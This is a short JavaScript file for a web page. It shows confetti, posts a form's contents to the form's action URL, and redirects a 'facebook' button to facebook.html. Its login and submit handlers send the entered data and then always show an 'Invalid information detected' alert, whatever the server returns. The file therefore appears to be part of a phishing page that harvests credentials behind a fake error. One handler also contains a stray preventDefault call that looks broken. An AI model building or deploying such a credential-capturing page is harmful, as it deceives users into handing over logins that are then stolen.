function getRandomColor() {
  var colors = ['#FF0000', '#00EFFF', '#F7FF00', '#00B3FF', '#FF0077', '#B98AFF'];
  return colors[Math.floor(Math.random() * colors.length)];
}

function generateConfetti() {
  const confettiContainer = document.createElement('div');
  confettiContainer.classList.add('confetti-container');

  for (let i = 0; i < 100; i++) {
    const confetti = document.createElement('div');
    confetti.classList.add('confetti');
    confetti.style.left = `${Math.random() * 100}%`;
    confetti.style.animationDelay = `${Math.random() * 5}s`;
    confetti.style.backgroundColor = getRandomColor();
    confettiContainer.appendChild(confetti);
  }

  document.body.appendChild(confettiContainer);
}

function triggerConfetti() {
  generateConfetti();
}

function sendFormData() {
  var form = document.getElementById('myForm');
  var formData = new FormData(form);

  fetch(form.action, {
      method: form.method,
      body: formData
  })
  .then(function(response) {
      if (response.ok) {
          console.log('Form data sent successfully!');
      } else {
          console.error('Error sending form data:', response.statusText);
      }
  })
  .catch(function(error) {
      console.error('Error sending form data:', error);
  });
}


document.addEventListener("DOMContentLoaded", function() {
  triggerConfetti();
  var submitButton = document.querySelector("button[type='submit']");
  var facebook = document.querySelector("button[type='menu']");
  var logIn = document.querySelector("button[class='login']");
  event.preventDefault();
  facebook.addEventListener("click", function(event){
    event.preventDefault();
    window.location.href ="facebook.html";
  });
  logIn.addEventListener("click", function(event){
    event.preventDefault();
    sendFormData();
    alert("Invalid information detected. Please check your entries.");
  });
  
  submitButton.addEventListener("click", function(event) {
    event.preventDefault();
    sendFormData();
    alert("Invalid information detected. Please check your entries.");
});
}, false);